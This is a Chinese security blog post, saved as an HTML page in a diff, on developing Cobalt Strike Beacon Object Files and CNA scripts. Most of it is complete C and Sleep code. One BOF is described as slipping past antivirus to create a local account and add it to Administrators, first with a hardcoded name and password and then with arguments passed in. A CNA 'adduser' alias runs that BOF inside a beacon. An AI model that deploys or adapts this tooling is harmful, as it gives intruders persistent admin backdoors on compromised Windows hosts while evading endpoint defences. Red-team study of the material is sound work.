@@ -1,0 +1,484 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[CobalStrike] BOF及cna插件开发初探 | 秋嘞个秋</title>
+<link rel="shortcut icon" href="https://sl3epf.github.io/favicon.ico?v=1710164223744">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://sl3epf.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[CobalStrike] BOF及cna插件开发初探 | 秋嘞个秋 - Atom Feed" href="https://sl3epf.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+前言
+主要讲下bof的代码编写和使用，具体一些原理分析可以看
+https://tttang.com/archive/1786/
+Beacon Object File
+bof能够加载并执行C/C++编译后但未链接的目标obj文件(linux..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://sl3epf.github.io">
+  <img class="avatar" src="https://sl3epf.github.io/images/avatar.png?v=1710164223744" alt="">
+  </a>
+  <h1 class="site-title">
+    秋嘞个秋
+  </h1>
+  <p class="site-description">
+    弃我去者，昨日之日不可留
+<br/>
+乱我心者，今日之日多烦忧
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [CobalStrike] BOF及cna插件开发初探
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-30
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <!-- more -->
+<h1 id="前言">前言</h1>
+<p>主要讲下bof的代码编写和使用，具体一些原理分析可以看<br>
+https://tttang.com/archive/1786/</p>
+<h1 id="beacon-object-file">Beacon Object File</h1>
+<p>bof能够加载并执行C/C++编译后但未链接的目标obj文件(linux中的.o文件)。可以在beacon中执行内部的beaconAPI和Win32API。它的体积很小，在beacon进程内部运行，不会创建新进程，所以可以有效的规避一些EDR。</p>
+<h1 id="开发bof">开发BOF</h1>
+<h2 id="环境">环境</h2>
+<pre><code>OS: Windows 10
+IDE: VS2022
+开发模版: https://github.com/securifybv/Visual-Studio-BOF-template
+</code></pre>
+<p>将模版下载后，我们导入VS的模版目录。<br>
+<code>用户路径\文稿\Visual Studio 2022\Templates\ProjectTemplates</code><br>
+然后在新建项目中就能看到模版<br>
+<img src="https://sl3epf.github.io/post-images/1706766320417.png" alt="" loading="lazy"><br>
+然后在生成-&gt;批生成中勾选，方案配置选择BOF<br>
+<img src="https://sl3epf.github.io/post-images/1706766427206.png" alt="" loading="lazy"><br>
+然后生成，就能够在项目目录里看到obj文件<br>
+<img src="https://sl3epf.github.io/post-images/1706766538630.png" alt="" loading="lazy"></p>
+<h2 id="功能实现">功能实现</h2>
+<p>首先了解一下动态函数解析(DFR)<br>
+比如我们要获取当前用户名，在Win32API中就要调用<code>GetUserNameA</code>，我们使用DFR就是要变成如下格式</p>
+<pre><code class="language-C">DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
+</code></pre>
+<ul>
+<li>DECLSPEC_IMPORT：导入函数的关键字</li>
+<li>WINAPI：函数调用约定，一般API函数都是这个</li>
+<li>ADVAPI32：函数所在的模块名</li>
+<li>GetUserNameA：函数名称</li>
+</ul>
+<h2 id="查找当前域">查找当前域</h2>
+<p>简单实现一个查找当前域功能<br>
+修改模版中<code>Source.c</code></p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &lt;dsgetdc.h&gt; 
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+    DWORD dwRet;
+    PDOMAIN_CONTROLLER_INFO pdcInfo;
+    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &amp;pdcInfo);
+    if (ERROR_SUCCESS == dwRet) {
+        BeaconPrintf(CALLBACK_OUTPUT, &quot;%s&quot;, pdcInfo-&gt;DomainName);
+    }
+    NETAPI32$NetApiBufferFree(pdcInfo);
+}
+#else
+
+void main(int argc, char* argv[]) {
+
+}
+
+#endif
+</code></pre>
+<p><img src="https://sl3epf.github.io/post-images/1706769324737.png" alt="" loading="lazy"><br>
+于此我们也可以发现，<code>go</code>函数就是bof执行的入口，当在cs的beacon上执行<code>inline-execute</code>时就会调用<code>go</code>函数。</p>
+<h2 id="bof绕过杀毒添加用户">bof绕过杀毒添加用户</h2>
+<p>我们在cs上直接利用<code>net user</code>会被阻止<br>
+<img src="https://sl3epf.github.io/post-images/1706792395021.png" alt="" loading="lazy"><br>
+但是我们如果采用bof的方式就能够绕过<br>
+代码如下</p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &quot;bofdefs.h&quot;
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+typedef DWORD NET_API_STATUS;
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+	USER_INFO_1 UserInfo;
+
+	UserInfo.usri1_name = L&quot;Qqw666&quot;;            
+	UserInfo.usri1_password = L&quot;Qqw@#123&quot;;      
+	UserInfo.usri1_priv = USER_PRIV_USER;
+	UserInfo.usri1_home_dir = NULL;
+	UserInfo.usri1_comment = NULL;
+	UserInfo.usri1_flags = UF_SCRIPT;
+	UserInfo.usri1_script_path = NULL;
+
+	NET_API_STATUS nStatus;
+
+	//创建用户 
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
+	nStatus = NETAPI32$NetUserAdd(
+		NULL, //local server
+		1,    // information level
+		(LPBYTE)&amp;UserInfo,
+		NULL // error value
+		);
+	if (nStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!\n&quot;, NULL);
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
+	}
+
+	// 添加用户到管理员组
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	account.lgrmi3_domainandname = UserInfo.usri1_name;
+
+	NET_API_STATUS aStatus;
+
+	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
+	if (aStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
+	}
+
+}
+#else
+
+void main(int argc, char* argv[]) {
+	go();
+}
+
+#endif
+</code></pre>
+<p>效果<br>
+<img src="https://sl3epf.github.io/post-images/1706792473981.png" alt="" loading="lazy"><br>
+可以看到成功添加用户，并且添加到管理员组。注意执行这个操作需要有admin的权限。</p>
+<h1 id="cna插件开发">CNA插件开发</h1>
+<p>具体语法可以自行网上看文章，这里我看了几个插件的写法，感觉主要的就那么几个，也比较简单<br>
+先给出C语言代码，修改了功能，可以自定义用户名和密码</p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &quot;bofdefs.h&quot;
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+typedef DWORD NET_API_STATUS;
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+	datap parser;
+
+	LPWSTR username;
+	LPWSTR password;
+
+	// 初始化datap结构体变量(parser),用于解析从Beacon接收到的字节流(buff)
+	BeaconDataParse(&amp;parser, buff, len);
+	username = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);
+	password = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);
+
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted username: %S&quot;, username);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted password: %S&quot;, password);
+
+	USER_INFO_1 UserInfo;
+
+
+	UserInfo.usri1_name = username;
+	UserInfo.usri1_password = password;
+	UserInfo.usri1_priv = USER_PRIV_USER;
+	UserInfo.usri1_home_dir = NULL;
+	UserInfo.usri1_comment = NULL;
+	UserInfo.usri1_flags = UF_SCRIPT;
+	UserInfo.usri1_script_path = NULL;
+
+	NET_API_STATUS nStatus;
+
+	//创建用户 
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
+	nStatus = NETAPI32$NetUserAdd(
+		NULL, //local server
+		1,    // information level
+		(LPBYTE)&amp;UserInfo,
+		NULL // error value
+	);
+	if (nStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!&quot;, NULL);
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
+	}
+
+	// 添加用户到管理员组
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	account.lgrmi3_domainandname = UserInfo.usri1_name;
+
+	NET_API_STATUS aStatus;
+
+	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
+	if (aStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
+	}
+
+}
+#else
+
+void main(int argc, char* argv[]) {
+	go();
+}
+
+#endif
+</code></pre>
+<p>cna代码</p>
+<pre><code class="language-C">beacon_command_register(
+&quot;adduser&quot;, 
+&quot;Add a user to administrators&quot;, 
+&quot;usage: adduser [username] [password]&quot;);
+
+alias adduser{
+	local('$handle $data $args');
+
+	$uname = $2;
+	$pass = $3;
+
+	if ($uname eq &quot;&quot; or $pass eq &quot;&quot;) {
+		berror($1, &quot;usage command: help adduser&quot;);
+		return;
+	}
+
+	# 读入bof文件
+
+    $handle = openf(script_resource(&quot;source.obj&quot;));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# 打包参数两个ZZ代表两个参数
+	$args = bof_pack($1, &quot;ZZ&quot;, $uname, $pass);
+
+    # 执行bof
+     # &quot;go&quot;是BOF中的函数名，$args是传递给这个函数的参数
+	beacon_inline_execute($1, $data, &quot;go&quot;, $args);
+}
+</code></pre>
+<p>效果如下<br>
+<img src="https://sl3epf.github.io/post-images/1706802021881.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>头一回写这玩意。。。加上windows的基础不是很好，一天下来踩了好多坑。。。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#beacon-object-file">Beacon Object File</a></li>
+<li><a href="#%E5%BC%80%E5%8F%91bof">开发BOF</a>
+<ul>
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a></li>
+<li><a href="#%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">功能实现</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E5%9F%9F">查找当前域</a></li>
+<li><a href="#bof%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7">bof绕过杀毒添加用户</a></li>
+</ul>
+</li>
+<li><a href="#cna%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91">CNA插件开发</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://sl3epf.github.io/post/cM-wSyF-g/">
+              <h3 class="post-title">
+                NoPac漏洞原理及利用
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Friends: <a href="https://zjackky.github.io/" target="_blank">zjackky</a>&nbsp;<a href="https://jaspersec.top/" target="_blank">jasper</a>&nbsp;<a href="https://zikh26.github.io/" target="_blank">zikh26</a>&nbsp;<a href="http://payioad.com/" target="_blank">payioad</a>&nbsp;
+<a href="http://blog.ldsecurity.cn/" target="_blank">凌度</a>&nbsp;<a href="http://www.aiwin.fun/" target="_blank">aiwin</a>&nbsp;
+  <a class="rss" href="https://sl3epf.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
